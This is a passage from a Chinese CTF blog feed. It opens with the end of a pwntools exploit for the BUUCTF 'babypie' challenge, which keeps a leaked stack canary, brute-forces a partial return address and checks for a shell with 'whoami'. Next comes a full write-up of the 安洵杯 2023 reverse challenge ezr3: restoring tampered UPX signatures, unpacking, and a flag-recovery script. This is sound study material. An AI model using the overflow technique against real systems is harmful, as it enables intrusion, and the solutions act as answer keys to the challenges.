<span class="token comment"># 构造 b'\xia'，即 address = p64(0xia42)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> address    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 注意不能用 sendline，不能添加换行符</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'whoami'</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'wyy'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"地址爆破成功："</span><span class="token punctuation">,</span> address<span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        address <span class="token operator">=</span> address<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">continue</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果二"><a href="#结果二" class="headerlink" title="结果二"></a>结果二</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-babypie9.png" alt="BUUCTF-babypie9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【安洵杯 2023】ezr3</title>
      <link href="/posts/676e3f8c.html"/>
      <url>/posts/676e3f8c.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><mark>UPX 壳存在特征码，特征码被修改会导致 UPX 脱壳失败</mark></li></ul><hr><p><a href="http://ctf.i-soon.net:8080/account/login?from=/games">（2023年6月10日）【安洵杯 2023】ezr3</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>用 IDA 打开，发现不对劲：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%201.png" alt="安洵杯2023-ez_ezr3 1.png"></p><p>函数很少，而且 <code>start()</code> 函数中参数爆红，应该是有壳</p><p>用 DIE 打开：（exeinfo pe 无法检测）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%202.png" alt="安洵杯2023-ez_ezr3 2.png"></p><p>发现 UPX 壳，但是 UPX 脱壳失败，提示没有 UPX 壳：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%203.png" alt="安洵杯2023-ez_ezr3 3.png"></p><p>用 010Editor 打开：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%204.png" alt="安洵杯2023-ez_ezr3 4.png"></p><p>发现 UPX 的特征码被改为 HCK，并且还有 Android 字样，根据架构 AARCH64 这应该是一个 Android 程序</p><p>在 IDA 中同样可以看到：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%205.png" alt="安洵杯2023-ez_ezr3 5.png"></p><p>在 010Editor 中将 HCK 全部替换为 UPX，并保存文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%206.png" alt="安洵杯2023-ez_ezr3 6.png"></p><p>不过由于是 UPX 4.02，我的版本不够，更新后脱壳成功：<br>UPX v4.0.2 下载地址：<a href="https://github.com/upx/upx/releases/tag/v4.0.2">Release v4.0.2 · upx&#x2F;upx (github.com)</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%207.png" alt="安洵杯2023-ez_ezr3 7.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%208.png" alt="安洵杯2023-ez_ezr3 8.png"></p><p>再次用 IDA 打开，恢复正常：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%209.png" alt="安洵杯2023-ez_ezr3 9.png"></p><p>定位到主函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%2010.png" alt="安洵杯2023-ez_ezr3 10.png"></p><p>一开始会先运行 <code>v()</code> 函数:</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%2011.png" alt="安洵杯2023-ez_ezr3 11.png"></p><p>有一些异或操作，不过逻辑看不大懂，只能看个大概</p><p><code>int8x16_t</code> 是一个数据类型，通常用于表示包含 16 个 8 位整数的向量。它是一种矢量类型，可以在特定的硬件架构（如 SIMD 指令集）中进行并行计算，以提高程序的性能<br>这里的 <code>v3</code> 做什么用的暂时不清楚，不过可以看到代码 <code>v4 = &amp;auth + v1</code> 对 <code>auth</code> 做了处理</p><p>跟进 <code>auth</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%2013.png" alt="安洵杯2023-ez_ezr3 13.png"></p><p>按照形式，使用 IDA 提取 <code>auth</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">auth <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x0003BC69</span><span class="token punctuation">,</span> <span class="token number">0x000D3FA0</span><span class="token punctuation">,</span> <span class="token number">0x0003A94A</span><span class="token punctuation">,</span> <span class="token number">0x00044AFF</span><span class="token punctuation">,</span> <span class="token number">0x00045254</span><span class="token punctuation">,</span> <span class="token number">0x0000CDD1</span><span class="token punctuation">,</span> <span class="token number">0x00001815</span><span class="token punctuation">,</span> <span class="token number">0x00003B08</span><span class="token punctuation">,</span> <span class="token number">0x00070868</span><span class="token punctuation">,</span>        <span class="token number">0x000C6560</span><span class="token punctuation">,</span> <span class="token number">0x00065662</span><span class="token punctuation">,</span> <span class="token number">0x000855C8</span><span class="token punctuation">,</span> <span class="token number">0x0000DCF6</span><span class="token punctuation">,</span> <span class="token number">0x00004CE6</span><span class="token punctuation">,</span> <span class="token number">0x0014EEC2</span><span class="token punctuation">,</span> <span class="token number">0x0002CFD6</span><span class="token punctuation">,</span> <span class="token number">0x00032766</span><span class="token punctuation">,</span> <span class="token number">0x0014F6BA</span><span class="token punctuation">,</span>        <span class="token number">0x00025E69</span><span class="token punctuation">,</span> <span class="token number">0x0006A9A3</span><span class="token punctuation">,</span> <span class="token number">0x00121EBD</span><span class="token punctuation">,</span> <span class="token number">0x0005991C</span><span class="token punctuation">,</span> <span class="token number">0x00050016</span><span class="token punctuation">,</span> <span class="token number">0x00004A3D</span><span class="token punctuation">,</span> <span class="token number">0x00097485</span><span class="token punctuation">,</span> <span class="token number">0x0008D0A0</span><span class="token punctuation">,</span> <span class="token number">0x0003B916</span><span class="token punctuation">,</span>        <span class="token number">0x00054C58</span><span class="token punctuation">,</span> <span class="token number">0x00096F94</span><span class="token punctuation">,</span> <span class="token number">0x00010334</span><span class="token punctuation">,</span> <span class="token number">0x000DAD22</span><span class="token punctuation">,</span> <span class="token number">0x0004B234</span><span class="token punctuation">,</span> <span class="token number">0x0002FE96</span><span class="token punctuation">,</span> <span class="token number">0x000F33CC</span><span class="token punctuation">,</span> <span class="token number">0x0012C1E8</span><span class="token punctuation">,</span> <span class="token number">0x00148F9E</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>主要经过的处理：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">v1 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>v2 <span class="token operator">=</span> <span class="token operator">&amp;</span>off_B6D0<span class="token punctuation">;</span><span class="token keyword">do</span><span class="token punctuation">&#123;</span>  v4 <span class="token operator">=</span> <span class="token operator">&amp;</span>auth <span class="token operator">+</span> v1<span class="token punctuation">;</span>  v1 <span class="token operator">+=</span> <span class="token number">24LL</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v2 <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span> v1 <span class="token operator">!=</span> <span class="token number">144</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据 <code>v1</code> 可知总共循环了 6 次，对应的逆向脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>auth<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        auth<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> mere<span class="token punctuation">[</span>v2 <span class="token operator">+</span> j <span class="token operator">*</span> <span class="token number">12</span><span class="token punctuation">]</span>    v2 <span class="token operator">+=</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>mere</code> 的数据如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mere <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x00000D21</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000009D</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000094B</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000003C9</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000C3F</span><span class="token punctuation">,</span>        <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000017E9</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000130E</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000088</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000486</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span>        <span class="token number">0x0000202F</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00002230</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000024B4</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000008B1</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000A9F</span><span class="token punctuation">,</span>        <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00001AD2</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000023EB</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000C7E</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000042B</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span>        <span class="token number">0x000005BF</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000113C</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000449</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00001751</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000ACE</span><span class="token punctuation">,</span>        <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00001894</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000208A</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000E82</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000006BD</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span>        <span class="token number">0x00000CEE</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00002386</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000013D4</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000111</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000D1C</span><span class="token punctuation">,</span>        <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000238E</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00001759</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000012B</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000214D</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span>        <span class="token number">0x00000040</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现后面还有一个 <code>p()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%AE%89%E6%B4%B5%E6%9D%AF2023-ez_ezr3%2012.png" alt="安洵杯2023-ez_ezr3 12.png"></p><p>进行了一次对数据前四位和后四位的转换，然后进行异或，最后进行验证</p><p>写出逆向脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>auth<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>auth<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">//</span> mere<span class="token punctuation">[</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> j <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    v2 <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">|</span> flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">auth <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x0003BC69</span><span class="token punctuation">,</span> <span class="token number">0x000D3FA0</span><span class="token punctuation">,</span> <span class="token number">0x0003A94A</span><span class="token punctuation">,</span> <span class="token number">0x00044AFF</span><span class="token punctuation">,</span> <span class="token number">0x00045254</span><span class="token punctuation">,</span> <span class="token number">0x0000CDD1</span><span class="token punctuation">,</span> <span class="token number">0x00001815</span><span class="token punctuation">,</span> <span class="token number">0x00003B08</span><span class="token punctuation">,</span> <span class="token number">0x00070868</span><span class="token punctuation">,</span>        <span class="token number">0x000C6560</span><span class="token punctuation">,</span> <span class="token number">0x00065662</span><span class="token punctuation">,</span> <span class="token number">0x000855C8</span><span class="token punctuation">,</span> <span class="token number">0x0000DCF6</span><span class="token punctuation">,</span> <span class="token number">0x00004CE6</span><span class="token punctuation">,</span> <span class="token number">0x0014EEC2</span><span class="token punctuation">,</span> <span class="token number">0x0002CFD6</span><span class="token punctuation">,</span> <span class="token number">0x00032766</span><span class="token punctuation">,</span> <span class="token number">0x0014F6BA</span><span class="token punctuation">,</span>        <span class="token number">0x00025E69</span><span class="token punctuation">,</span> <span class="token number">0x0006A9A3</span><span class="token punctuation">,</span> <span class="token number">0x00121EBD</span><span class="token punctuation">,</span> <span class="token number">0x0005991C</span><span class="token punctuation">,</span> <span class="token number">0x00050016</span><span class="token punctuation">,</span> <span class="token number">0x00004A3D</span><span class="token punctuation">,</span> <span class="token number">0x00097485</span><span class="token punctuation">,</span> <span class="token number">0x0008D0A0</span><span class="token punctuation">,</span> <span class="token number">0x0003B916</span><span class="token punctuation">,</span>        <span class="token number">0x00054C58</span><span class="token punctuation">,</span> <span class="token number">0x00096F94</span><span class="token punctuation">,</span> <span class="token number">0x00010334</span><span class="token punctuation">,</span> <span class="token number">0x000DAD22</span><span class="token punctuation">,</span> <span class="token number">0x0004B234</span><span class="token punctuation">,</span> <span class="token number">0x0002FE96</span><span class="token punctuation">,</span> <span class="token number">0x000F33CC</span><span class="token punctuation">,</span> <span class="token number">0x0012C1E8</span><span class="token punctuation">,</span> <span class="token number">0x00148F9E</span><span class="token punctuation">]</span>mere <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x00000D21</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000009D</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000094B</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000003C9</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000C3F</span><span class="token punctuation">,</span>        <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000017E9</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000130E</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000088</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000486</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span>        <span class="token number">0x0000202F</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00002230</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000024B4</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000008B1</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000A9F</span><span class="token punctuation">,</span>        <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00001AD2</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000023EB</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000C7E</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000042B</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span>        <span class="token number">0x000005BF</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000113C</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000449</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00001751</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000ACE</span><span class="token punctuation">,</span>        <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00001894</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000208A</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000E82</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000006BD</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span>        <span class="token number">0x00000CEE</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00002386</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x000013D4</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000111</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000D1C</span><span class="token punctuation">,</span>        <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000238E</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00001759</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000012B</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x0000214D</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span>        <span class="token number">0x00000040</span><span class="token punctuation">]</span>v2 <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>auth<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        auth<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> mere<span class="token punctuation">[</span>v2 <span class="token operator">+</span> j <span class="token operator">*</span> <span class="token number">12</span><span class="token punctuation">]</span>    v2 <span class="token operator">+=</span> <span class="token number">2</span>v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>auth<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>auth<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">//</span> mere<span class="token punctuation">[</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> j <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    v2 <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">|</span> flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" 